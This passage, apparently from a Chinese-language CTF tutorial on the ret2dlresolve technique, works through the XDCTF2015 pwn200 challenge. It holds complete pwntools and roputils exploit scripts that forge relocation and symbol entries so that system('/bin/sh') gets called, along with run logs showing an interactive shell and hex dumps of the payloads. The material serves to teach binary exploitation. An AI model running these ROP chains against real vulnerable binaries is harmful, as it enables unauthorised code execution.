<span class=w>    </span>Stack:<span class=w>    </span>No<span class=w> </span>canary<span class=w> </span>found
<span class=w>    </span>NX:<span class=w>       </span>NX<span class=w> </span>enabled
<span class=w>    </span>PIE:<span class=w>      </span>No<span class=w> </span>PIE<span class=w> </span><span class=o>(</span>0x8048000<span class=o>)</span>
<span class=o>[</span>+<span class=o>]</span><span class=w> </span>Starting<span class=w> </span><span class=nb>local</span><span class=w> </span>process<span class=w> </span><span class=s1>&#39;./main_partial_relro_32&#39;</span>:<span class=w> </span>pid<span class=w> </span><span class=m>27994</span>
<span class=o>[</span>*<span class=o>]</span><span class=w> </span>Loaded<span class=w> </span><span class=m>10</span><span class=w> </span>cached<span class=w> </span>gadgets<span class=w> </span><span class=k>for</span><span class=w> </span><span class=s1>&#39;./main_partial_relro_32&#39;</span>
<span class=o>[</span>*<span class=o>]</span><span class=w> </span>Switching<span class=w> </span>to<span class=w> </span>interactive<span class=w> </span>mode
/bin/sh<span class=o>[</span>*<span class=o>]</span><span class=w> </span>Got<span class=w> </span>EOF<span class=w> </span><span class=k>while</span><span class=w> </span>reading<span class=w> </span><span class=k>in</span><span class=w> </span>interactive
</code></pre></div> <p>事實上，這裏的 index_dynsym 又發生了變化，但似乎並不影響，因此我們也不用再想辦法僞造數據了。</p> <h5 id=stage-6>stage 6<a class=headerlink href=#stage-6 title="Permanent link">&para;</a></h5> <p>這一階段，我們只需要將原先的 write 字符串修改爲 system 字符串，同時修改 write 的參數爲 system 的參數即可獲取 shell。這是因爲 <code>_dl_runtime_resolve</code> 函數最終是依賴函數名來解析目標地址的。</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
<span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
<span class=n>r</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>

<span class=n>offset</span> <span class=o>=</span> <span class=mi>112</span>
<span class=n>bss_addr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>bss</span><span class=p>()</span>

<span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Welcome to XDCTF2015~!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>

<span class=c1># stack privot to bss segment, set esp = base_stage</span>
<span class=n>stack_size</span> <span class=o>=</span> <span class=mh>0x800</span> <span class=c1># new stack size is 0x800</span>
<span class=n>base_stage</span> <span class=o>=</span> <span class=n>bss_addr</span> <span class=o>+</span> <span class=n>stack_size</span> <span class=o>+</span> <span class=p>(</span><span class=mh>0x080487C2</span><span class=o>-</span><span class=mh>0x080487A8</span><span class=p>)</span><span class=o>/</span><span class=mi>2</span><span class=o>*</span><span class=mh>0x10</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=n>offset</span><span class=p>)</span> <span class=c1># padding</span>
<span class=n>rop</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>base_stage</span><span class=p>,</span> <span class=mi>100</span><span class=p>)</span> <span class=c1># read 100 byte to base_stage</span>
<span class=n>rop</span><span class=o>.</span><span class=n>migrate</span><span class=p>(</span><span class=n>base_stage</span><span class=p>)</span>
<span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>


<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
<span class=n>sh</span> <span class=o>=</span> <span class=s2>&quot;/bin/sh&quot;</span>

<span class=n>plt0</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
<span class=n>rel_plt</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.rel.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
<span class=n>dynsym</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.dynsym&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
<span class=n>dynstr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.dynstr&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>

<span class=c1># make a fake write symbol at base_stage + 32 + align</span>
<span class=n>fake_sym_addr</span> <span class=o>=</span> <span class=n>base_stage</span> <span class=o>+</span> <span class=mi>32</span>
<span class=n>align</span> <span class=o>=</span> <span class=mh>0x10</span> <span class=o>-</span> <span class=p>((</span><span class=n>fake_sym_addr</span> <span class=o>-</span> <span class=n>dynsym</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xf</span><span class=p>)</span>  <span class=c1># since the size of Elf32_Symbol is 0x10</span>
<span class=n>fake_sym_addr</span> <span class=o>=</span> <span class=n>fake_sym_addr</span> <span class=o>+</span> <span class=n>align</span>
<span class=n>index_dynsym</span> <span class=o>=</span> <span class=p>(</span><span class=n>fake_sym_addr</span> <span class=o>-</span> <span class=n>dynsym</span><span class=p>)</span> <span class=o>/</span> <span class=mh>0x10</span>  <span class=c1># calculate the dynsym index of write</span>
<span class=n>st_name</span> <span class=o>=</span> <span class=n>fake_sym_addr</span> <span class=o>+</span> <span class=mh>0x10</span> <span class=o>-</span> <span class=n>dynstr</span>         <span class=c1># plus 10 since the size of Elf32_Sym is 16.</span>
<span class=n>fake_write_sym</span> <span class=o>=</span> <span class=n>flat</span><span class=p>([</span><span class=n>st_name</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x12</span><span class=p>])</span>

<span class=c1># make fake write relocation at base_stage+24</span>
<span class=n>index_offset</span> <span class=o>=</span> <span class=n>base_stage</span> <span class=o>+</span> <span class=mi>24</span> <span class=o>-</span> <span class=n>rel_plt</span>
<span class=n>write_got</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;write&#39;</span><span class=p>]</span>
<span class=n>r_info</span> <span class=o>=</span> <span class=p>(</span><span class=n>index_dynsym</span> <span class=o>&lt;&lt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>|</span> <span class=mh>0x7</span> <span class=c1># calculate the r_info according to the index of write</span>
<span class=n>fake_write_reloc</span> <span class=o>=</span> <span class=n>flat</span><span class=p>([</span><span class=n>write_got</span><span class=p>,</span> <span class=n>r_info</span><span class=p>])</span>

<span class=n>gnu_version_addr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.gnu.version&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
<span class=nb>print</span><span class=p>(</span><span class=s2>&quot;ndx_addr: </span><span class=si>%s</span><span class=s2>&quot;</span> <span class=o>%</span> <span class=nb>hex</span><span class=p>(</span><span class=n>gnu_version_addr</span><span class=o>+</span><span class=n>index_dynsym</span><span class=o>*</span><span class=mi>2</span><span class=p>))</span>

<span class=c1># construct ropchain</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>plt0</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>index_offset</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;bbbb&#39;</span><span class=p>)</span> <span class=c1># fake ret addr of write</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>base_stage</span> <span class=o>+</span> <span class=mi>82</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;bbbb&#39;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;bbbb&#39;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>fake_write_reloc</span><span class=p>)</span>  <span class=c1># fake write reloc</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=n>align</span><span class=p>)</span>  <span class=c1># padding</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>fake_write_sym</span><span class=p>)</span>  <span class=c1># fake write symbol</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;system</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>  <span class=c1># there must be a \x00 to mark the end of string</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mi>80</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>sh</span> <span class=o>+</span> <span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mi>100</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=nb>print</span> <span class=n>rop</span><span class=o>.</span><span class=n>dump</span><span class=p>()</span>
<span class=nb>print</span> <span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></div> <p>需要注意的是，這裏我把 /bin/sh 的偏移修改爲了 base_stage+82，這是因爲 pwntools 會對齊字符串。如下面的 ropchain 所示，0x40 處多了兩個 a，比較奇怪。</p> <div class=highlight><pre><span></span><code>0x0038:           &#39;syst&#39; &#39;system\x00&#39;
0x003c:        &#39;em\x00o&#39;
0x0040:             &#39;aa&#39;
0x0042:           &#39;aaaa&#39; &#39;aaaaaaaaaaaaaa&#39;
</code></pre></div> <p>效果如下</p> <div class=highlight><pre><span></span><code>❯<span class=w> </span>python<span class=w> </span>stage6.py
<span class=o>[</span>*<span class=o>]</span><span class=w> </span><span class=s1>&#39;/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32&#39;</span>
<span class=w>    </span>Arch:<span class=w>     </span>i386-32-little
<span class=w>    </span>RELRO:<span class=w>    </span>Partial<span class=w> </span>RELRO
<span class=w>    </span>Stack:<span class=w>    </span>No<span class=w> </span>canary<span class=w> </span>found
<span class=w>    </span>NX:<span class=w>       </span>NX<span class=w> </span>enabled
<span class=w>    </span>PIE:<span class=w>      </span>No<span class=w> </span>PIE<span class=w> </span><span class=o>(</span>0x8048000<span class=o>)</span>
<span class=o>[</span>+<span class=o>]</span><span class=w> </span>Starting<span class=w> </span><span class=nb>local</span><span class=w> </span>process<span class=w> </span><span class=s1>&#39;./main_partial_relro_32&#39;</span>:<span class=w> </span>pid<span class=w> </span><span class=m>28204</span>
<span class=o>[</span>*<span class=o>]</span><span class=w> </span>Loaded<span class=w> </span><span class=m>10</span><span class=w> </span>cached<span class=w> </span>gadgets<span class=w> </span><span class=k>for</span><span class=w> </span><span class=s1>&#39;./main_partial_relro_32&#39;</span>
ndx_addr:<span class=w> </span>0x80487c2
0x0000:<span class=w>        </span>0x8048370
0x0004:<span class=w>           </span>0x25ec
0x0008:<span class=w>           </span><span class=s1>&#39;bbbb&#39;</span><span class=w> </span><span class=s1>&#39;bbbb&#39;</span>
0x000c:<span class=w>        </span>0x804a94a
0x0010:<span class=w>           </span><span class=s1>&#39;bbbb&#39;</span><span class=w> </span><span class=s1>&#39;bbbb&#39;</span>
0x0014:<span class=w>           </span><span class=s1>&#39;bbbb&#39;</span><span class=w> </span><span class=s1>&#39;bbbb&#39;</span>
0x0018:<span class=w> </span><span class=s1>&#39;\x1c\xa0\x04\x08&#39;</span><span class=w> </span><span class=s1>&#39;\x1c\xa0\x04\x08\x07u\x02\x00&#39;</span>
0x001c:<span class=w>  </span><span class=s1>&#39;\x07u\x02\x00&#39;</span>
0x0020:<span class=w>           </span><span class=s1>&#39;aaaa&#39;</span><span class=w> </span><span class=s1>&#39;aaaa&#39;</span>
0x0024:<span class=w>  </span><span class=s1>&#39;\xc0&amp;\x00\x00&#39;</span><span class=w> </span><span class=s1>&#39;\xc0&amp;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x12\x00\x00\x00&#39;</span>
0x0028:<span class=w> </span><span class=s1>&#39;\x00\x00\x00\x00&#39;</span>
0x002c:<span class=w> </span><span class=s1>&#39;\x00\x00\x00\x00&#39;</span>
0x0030:<span class=w> </span><span class=s1>&#39;\x12\x00\x00\x00&#39;</span>
0x0034:<span class=w>           </span><span class=s1>&#39;syst&#39;</span><span class=w> </span><span class=s1>&#39;system\x00&#39;</span>
0x0038:<span class=w>        </span><span class=s1>&#39;em\x00n&#39;</span>
0x003c:<span class=w>             </span><span class=s1>&#39;aa&#39;</span>
0x003e:<span class=w>           </span><span class=s1>&#39;aaaa&#39;</span><span class=w> </span><span class=s1>&#39;aaaaaaaaaaaaaaaaaa&#39;</span>
0x0042:<span class=w>           </span><span class=s1>&#39;aaaa&#39;</span>
0x0046:<span class=w>           </span><span class=s1>&#39;aaaa&#39;</span>
0x004a:<span class=w>           </span><span class=s1>&#39;aaaa&#39;</span>
0x004e:<span class=w>           </span><span class=s1>&#39;aaaa&#39;</span>
0x0052:<span class=w>           </span><span class=s1>&#39;/bin&#39;</span><span class=w> </span><span class=s1>&#39;/bin/sh\x00&#39;</span>
0x0056:<span class=w>        </span><span class=s1>&#39;/sh\x00&#39;</span>
0x005a:<span class=w>           </span><span class=s1>&#39;aaaa&#39;</span><span class=w> </span><span class=s1>&#39;aaaaaaaaaa&#39;</span>
0x005e:<span class=w>           </span><span class=s1>&#39;aaaa&#39;</span>
0x0062:<span class=w>           </span><span class=s1>&#39;aaaa&#39;</span>
<span class=m>102</span>
<span class=o>[</span>*<span class=o>]</span><span class=w> </span>Switching<span class=w> </span>to<span class=w> </span>interactive<span class=w> </span>mode
/bin/sh:<span class=w> </span><span class=m>1</span>:<span class=w> </span>aa:<span class=w> </span>not<span class=w> </span>found
$<span class=w> </span>ls
exp-pwntools.py<span class=w>        </span>roptool.py<span class=w>    </span>stage2.py<span class=w>    </span>stage5.py
ld-linux.so.2<span class=w>           </span>roputils.pyc<span class=w>  </span>stage3.py<span class=w>    </span>stage6.py
main_partial_relro_32<span class=w>  </span>stage1.py<span class=w>     </span>stage4.py
</code></pre></div> <h4 id=_3>基於工具僞造<a class=headerlink href=#_3 title="Permanent link">&para;</a></h4> <p>根據上面的介紹，我們應該可以理解這個攻擊了。</p> <h5 id=roputil>Roputil<a class=headerlink href=#roputil title="Permanent link">&para;</a></h5> <p>下面我們直接使用 roputil 來進行攻擊。代碼如下</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>roputils</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
<span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=n>process</span>
<span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=n>gdb</span>
<span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=n>context</span>
<span class=n>r</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./main&#39;</span><span class=p>)</span>
<span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
<span class=n>r</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span>

<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s1>&#39;./main&#39;</span><span class=p>)</span>
<span class=n>offset</span> <span class=o>=</span> <span class=mi>112</span>
<span class=n>bss_base</span> <span class=o>=</span> <span class=n>rop</span><span class=o>.</span><span class=n>section</span><span class=p>(</span><span class=s1>&#39;.bss&#39;</span><span class=p>)</span>
<span class=n>buf</span> <span class=o>=</span> <span class=n>rop</span><span class=o>.</span><span class=n>fill</span><span class=p>(</span><span class=n>offset</span><span class=p>)</span>

<span class=n>buf</span> <span class=o>+=</span> <span class=n>rop</span><span class=o>.</span><span class=n>call</span><span class=p>(</span><span class=s1>&#39;read&#39;</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>bss_base</span><span class=p>,</span> <span class=mi>100</span><span class=p>)</span>
<span class=c1>## used to call dl_runtimeresolve()</span>
<span class=n>buf</span> <span class=o>+=</span> <span class=n>rop</span><span class=o>.</span><span class=n>dl_resolve_call</span><span class=p>(</span><span class=n>bss_base</span> <span class=o>+</span> <span class=mi>20</span><span class=p>,</span> <span class=n>bss_base</span><span class=p>)</span>
<span class=n>r</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>buf</span><span class=p>)</span>

<span class=n>buf</span> <span class=o>=</span> <span class=n>rop</span><span class=o>.</span><span class=n>string</span><span class=p>(</span><span class=s1>&#39;/bin/sh&#39;</span><span class=p>)</span>
<span class=n>buf</span> <span class=o>+=</span> <span class=n>rop</span><span class=o>.</span><span class=n>fill</span><span class=p>(</span><span class=mi>20</span><span class=p>,</span> <span class=n>buf</span><span class=p>)</span>
<span class=c1>## used to make faking data, such relocation, Symbol, Str</span>
<span class=n>buf</span> <span class=o>+=</span> <span class=n>rop</span><span class=o>.</span><span class=n>dl_resolve_data</span><span class=p>(</span><span class=n>bss_base</span> <span class=o>+</span> <span class=mi>20</span><span class=p>,</span> <span class=s1>&#39;system&#39;</span><span class=p>)</span>
<span class=n>buf</span> <span class=o>+=</span> <span class=n>rop</span><span class=o>.</span><span class=n>fill</span><span class=p>(</span><span class=mi>100</span><span class=p>,</span> <span class=n>buf</span><span class=p>)</span>
<span class=n>r</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>buf</span><span class=p>)</span>
<span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></div> <p>關於 dl_resolve_call 與 dl_resolve_data 的具體細節請參考 roputils.py 的源碼，比較容易理解。需要注意的是，dl_resolve 執行完之後也是需要有對應的返回地址的。</p> <p>效果如下</p> <div class=highlight><pre><span></span><code>❯<span class=w> </span>python<span class=w> </span>roptool.py
<span class=o>[</span>+<span class=o>]</span><span class=w> </span>Starting<span class=w> </span><span class=nb>local</span><span class=w> </span>process<span class=w> </span><span class=s1>&#39;./main_partial_relro_32&#39;</span>:<span class=w> </span>pid<span class=w> </span><span class=m>24673</span>
<span class=o>[</span>DEBUG<span class=o>]</span><span class=w> </span>Received<span class=w> </span>0x17<span class=w> </span>bytes:
<span class=w>    </span><span class=s1>&#39;Welcome to XDCTF2015~!\n&#39;</span>
<span class=o>[</span>DEBUG<span class=o>]</span><span class=w> </span>Sent<span class=w> </span>0x94<span class=w> </span>bytes:
<span class=w>    </span><span class=m>00000000</span><span class=w>  </span><span class=m>42</span><span class=w> </span>6a<span class=w> </span><span class=m>63</span><span class=w> </span><span class=m>57</span><span class=w>  </span><span class=m>32</span><span class=w> </span><span class=m>34</span><span class=w> </span><span class=m>75</span><span class=w> </span>7a<span class=w>  </span><span class=m>30</span><span class=w> </span><span class=m>64</span><span class=w> </span>6d<span class=w> </span><span class=m>71</span><span class=w>  </span><span class=m>45</span><span class=w> </span><span class=m>54</span><span class=w> </span><span class=m>50</span><span class=w> </span><span class=m>31</span><span class=w>  </span>│BjcW│24uz│0dmq│ETP1│
<span class=w>    </span><span class=m>00000010</span><span class=w>  </span><span class=m>42</span><span class=w> </span><span class=m>63</span><span class=w> </span>4b<span class=w> </span><span class=m>61</span><span class=w>  </span>4c<span class=w> </span><span class=m>76</span><span class=w> </span>5a<span class=w> </span><span class=m>35</span><span class=w>  </span><span class=m>38</span><span class=w> </span><span class=m>77</span><span class=w> </span><span class=m>79</span><span class=w> </span>6d<span class=w>  </span>4c<span class=w> </span><span class=m>62</span><span class=w> </span><span class=m>34</span><span class=w> </span><span class=m>74</span><span class=w>  </span>│BcKa│LvZ5│8wym│Lb4t│
<span class=w>    </span><span class=m>00000020</span><span class=w>  </span><span class=m>56</span><span class=w> </span><span class=m>47</span><span class=w> </span>4c<span class=w> </span><span class=m>57</span><span class=w>  </span><span class=m>62</span><span class=w> </span><span class=m>67</span><span class=w> </span><span class=m>55</span><span class=w> </span>4b<span class=w>  </span><span class=m>65</span><span class=w> </span><span class=m>57</span><span class=w> </span>4c<span class=w> </span><span class=m>64</span><span class=w>  </span><span class=m>34</span><span class=w> </span><span class=m>62</span><span class=w> </span>6f<span class=w> </span><span class=m>47</span><span class=w>  </span>│VGLW│bgUK│eWLd│4boG│
<span class=w>    </span><span class=m>00000030</span><span class=w>  </span><span class=m>43</span><span class=w> </span><span class=m>47</span><span class=w> </span><span class=m>59</span><span class=w> </span><span class=m>65</span><span class=w>  </span>4f<span class=w> </span><span class=m>41</span><span class=w> </span><span class=m>73</span><span class=w> </span>4c<span class=w>  </span><span class=m>61</span><span class=w> </span><span class=m>35</span><span class=w> </span><span class=m>79</span><span class=w> </span>4f<span class=w>  </span><span class=m>56</span><span class=w> </span><span class=m>47</span><span class=w> </span><span class=m>51</span><span class=w> </span><span class=m>71</span><span class=w>  </span>│CGYe│OAsL│a5yO│VGQq│
<span class=w>    </span><span class=m>00000040</span><span class=w>  </span><span class=m>59</span><span class=w> </span><span class=m>53</span><span class=w> </span><span class=m>47</span><span class=w> </span><span class=m>69</span><span class=w>  </span>6e<span class=w> </span><span class=m>68</span><span class=w> </span><span class=m>62</span><span class=w> </span><span class=m>35</span><span class=w>  </span>6f<span class=w> </span><span class=m>33</span><span class=w> </span>4a<span class=w> </span>6e<span class=w>  </span><span class=m>31</span><span class=w> </span><span class=m>77</span><span class=w> </span><span class=m>66</span><span class=w> </span><span class=m>68</span><span class=w>  </span>│YSGi│nhb5│o3Jn│1wfh│
<span class=w>    </span><span class=m>00000050</span><span class=w>  </span><span class=m>45</span><span class=w> </span>6f<span class=w> </span><span class=m>38</span><span class=w> </span>6b<span class=w>  </span><span class=m>61</span><span class=w> </span><span class=m>46</span><span class=w> </span><span class=m>46</span><span class=w> </span><span class=m>38</span><span class=w>  </span>4f<span class=w> </span><span class=m>67</span><span class=w> </span>6c<span class=w> </span><span class=m>62</span><span class=w>  </span><span class=m>61</span><span class=w> </span><span class=m>41</span><span class=w> </span><span class=m>58</span><span class=w> </span><span class=m>47</span><span class=w>  </span>│Eo8k│aFF8│Oglb│aAXG│
<span class=w>    </span><span class=m>00000060</span><span class=w>  </span><span class=m>66</span><span class=w> </span>7a<span class=w> </span>4b<span class=w> </span><span class=m>30</span><span class=w>  </span><span class=m>63</span><span class=w> </span>6d<span class=w> </span><span class=m>43</span><span class=w> </span><span class=m>43</span><span class=w>  </span><span class=m>74</span><span class=w> </span><span class=m>73</span><span class=w> </span>4d<span class=w> </span>7a<span class=w>  </span><span class=m>52</span><span class=w> </span><span class=m>66</span><span class=w> </span><span class=m>58</span><span class=w> </span><span class=m>63</span><span class=w>  </span>│fzK0│cmCC│tsMz│RfXc│
<span class=w>    </span><span class=m>00000070</span><span class=w>  </span>a0<span class=w> </span><span class=m>83</span><span class=w> </span><span class=m>04</span><span class=w> </span><span class=m>08</span><span class=w>  </span><span class=m>19</span><span class=w> </span><span class=m>86</span><span class=w> </span><span class=m>04</span><span class=w> </span><span class=m>08</span><span class=w>  </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w>  </span><span class=m>40</span><span class=w> </span>a0<span class=w> </span><span class=m>04</span><span class=w> </span><span class=m>08</span><span class=w>  </span>│····│····│····│@···│
<span class=w>    </span><span class=m>00000080</span><span class=w>  </span><span class=m>64</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w>  </span><span class=m>80</span><span class=w> </span><span class=m>83</span><span class=w> </span><span class=m>04</span><span class=w> </span><span class=m>08</span><span class=w>  </span><span class=m>28</span><span class=w> </span>1d<span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w>  </span><span class=m>79</span><span class=w> </span><span class=m>83</span><span class=w> </span><span class=m>04</span><span class=w> </span><span class=m>08</span><span class=w>  </span>│d···│····│<span class=o>(</span>···│y···│
<span class=w>    </span><span class=m>00000090</span><span class=w>  </span><span class=m>40</span><span class=w> </span>a0<span class=w> </span><span class=m>04</span><span class=w> </span><span class=m>08</span><span class=w>                                         </span>│@···│
<span class=w>    </span><span class=m>00000094</span>
<span class=o>[</span>DEBUG<span class=o>]</span><span class=w> </span>Sent<span class=w> </span>0x64<span class=w> </span>bytes:
<span class=w>    </span><span class=m>00000000</span><span class=w>  </span>2f<span class=w> </span><span class=m>62</span><span class=w> </span><span class=m>69</span><span class=w> </span>6e<span class=w>  </span>2f<span class=w> </span><span class=m>73</span><span class=w> </span><span class=m>68</span><span class=w> </span><span class=m>00</span><span class=w>  </span><span class=m>35</span><span class=w> </span><span class=m>45</span><span class=w> </span>4e<span class=w> </span><span class=m>50</span><span class=w>  </span>6e<span class=w> </span><span class=m>51</span><span class=w> </span><span class=m>51</span><span class=w> </span>4b<span class=w>  </span>│/bin│/sh·│5ENP│nQQK│
<span class=w>    </span><span class=m>00000010</span><span class=w>  </span><span class=m>74</span><span class=w> </span><span class=m>30</span><span class=w> </span><span class=m>57</span><span class=w> </span><span class=m>47</span><span class=w>  </span><span class=m>62</span><span class=w> </span><span class=m>55</span><span class=w> </span><span class=m>49</span><span class=w> </span><span class=m>54</span><span class=w>  </span><span class=m>54</span><span class=w> </span>a0<span class=w> </span><span class=m>04</span><span class=w> </span><span class=m>08</span><span class=w>  </span><span class=m>07</span><span class=w> </span>e9<span class=w> </span><span class=m>01</span><span class=w> </span><span class=m>00</span><span class=w>  </span>│t0WG│bUIT│T···│····│
<span class=w>    </span><span class=m>00000020</span><span class=w>  </span>6c<span class=w> </span><span class=m>30</span><span class=w> </span><span class=m>39</span><span class=w> </span><span class=m>79</span><span class=w>  </span><span class=m>68</span><span class=w> </span>4c<span class=w> </span><span class=m>58</span><span class=w> </span>4b<span class=w>  </span><span class=m>00</span><span class=w> </span>1e<span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w>  </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w>  </span>│l09y│hLXK│····│····│
<span class=w>    </span><span class=m>00000030</span><span class=w>  </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w>  </span><span class=m>12</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w>  </span><span class=m>73</span><span class=w> </span><span class=m>79</span><span class=w> </span><span class=m>73</span><span class=w> </span><span class=m>74</span><span class=w>  </span><span class=m>65</span><span class=w> </span>6d<span class=w> </span><span class=m>00</span><span class=w> </span>7a<span class=w>  </span>│····│····│syst│em·z│
<span class=w>    </span><span class=m>00000040</span><span class=w>  </span><span class=m>32</span><span class=w> </span><span class=m>45</span><span class=w> </span><span class=m>74</span><span class=w> </span><span class=m>78</span><span class=w>  </span><span class=m>75</span><span class=w> </span><span class=m>35</span><span class=w> </span><span class=m>59</span><span class=w> </span>6a<span class=w>  </span><span class=m>55</span><span class=w> </span>6b<span class=w> </span><span class=m>54</span><span class=w> </span><span class=m>74</span><span class=w>  </span><span class=m>63</span><span class=w> </span><span class=m>46</span><span class=w> </span><span class=m>70</span><span class=w> </span><span class=m>71</span><span class=w>  </span>│2Etx│u5Yj│UkTt│cFpq│
